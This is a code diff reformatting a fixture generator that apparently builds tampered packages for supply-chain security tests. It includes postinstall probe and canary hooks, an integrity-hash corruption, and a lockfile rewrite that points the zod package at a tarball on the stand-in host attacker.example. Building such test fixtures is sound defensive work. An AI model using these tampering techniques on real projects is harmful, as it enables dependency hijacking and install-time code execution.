@@ -98,16 +98,19 @@ export async function createFixture(kind, directory, deps) {
     const text = await readFile(config, "utf8");
     await writeFile(
       config,
-      text.replace('  description: "Describe', '  publishes: ["app.submitted"],\n  description: "Describe'),
+      text.replace(
+        '  description: "Describe',
+        '  publishes: ["app.submitted"],\n  description: "Describe',
+      ),
     );
   }
   if (kind === "probe") {
     await writeFile(
       join(directory, "src/probe.mjs"),
-      PROBE.replace("FOREIGN_SOURCE_URL ?", `${JSON.stringify(deps.foreignSourceUrl ?? "")} ?`).replace(
-        "FOREIGN_SOURCE_URL)",
-        `${JSON.stringify(deps.foreignSourceUrl ?? "")})`,
-      ),
+      PROBE.replace(
+        "FOREIGN_SOURCE_URL ?",
+        `${JSON.stringify(deps.foreignSourceUrl ?? "")} ?`,
+      ).replace("FOREIGN_SOURCE_URL)", `${JSON.stringify(deps.foreignSourceUrl ?? "")})`),
     );
     await editJson(pkg, (p) => (p.scripts.postinstall = "node src/probe.mjs"));
   }
@@ -115,7 +118,8 @@ export async function createFixture(kind, directory, deps) {
     await writeFile(join(directory, "src/canary.mjs"), CANARY);
     await editJson(pkg, (p) => (p.scripts.postinstall = "node src/canary.mjs"));
   }
-  if (kind === "failing-build") await editJson(pkg, (p) => (p.scripts.build = "node -e process.exit(3)"));
+  if (kind === "failing-build")
+    await editJson(pkg, (p) => (p.scripts.build = "node -e process.exit(3)"));
   if (kind === "oversized")
     await editJson(pkg, (p) => {
       p.scripts.build = `tsc -p tsconfig.json && node -e ${JSON.stringify(
@@ -143,10 +147,16 @@ export async function createFixture(kind, directory, deps) {
           `--config.@embody:registry=${deps.registryUrl}`,
           "--config.registry=https://registry.npmjs.org/",
         ],
-        { cwd: directory, stdio: ["ignore", "ignore", "inherit"], env: { ...process.env, CI: "true" } },
+        {
+          cwd: directory,
+          stdio: ["ignore", "ignore", "inherit"],
+          env: { ...process.env, CI: "true" },
+        },
       );
       child.on("error", reject);
-      child.on("close", (code) => (code === 0 ? resolve() : reject(new Error(`lockfile generation failed for ${kind}`))));
+      child.on("close", (code) =>
+        code === 0 ? resolve() : reject(new Error(`lockfile generation failed for ${kind}`)),
+      );
     });
   }
   const lock = join(directory, "pnpm-lock.yaml");
@@ -159,7 +169,7 @@ export async function createFixture(kind, directory, deps) {
     await writeFile(
       lock,
       text.replace(
-        /(\n  zod@[^:]+:\n    resolution: )\{integrity: [^}]+\}/,
+        /(\n {2}zod@[^:]+:\n {4}resolution: )\{integrity: [^}]+\}/,
         "$1{tarball: https://attacker.example/zod.tgz}",
       ),
     );
@@ -169,7 +179,7 @@ export async function createFixture(kind, directory, deps) {
     await writeFile(
       lock,
       text.replace(
-        /(\n  '@embody\/core@[^:]+:\n    resolution: \{integrity: sha512-)[A-Za-z0-9+/]{4}/,
+        /(\n {2}'@embody\/core@[^:]+:\n {4}resolution: \{integrity: sha512-)[A-Za-z0-9+/]{4}/,
         "$1AAAA",
       ),
     );
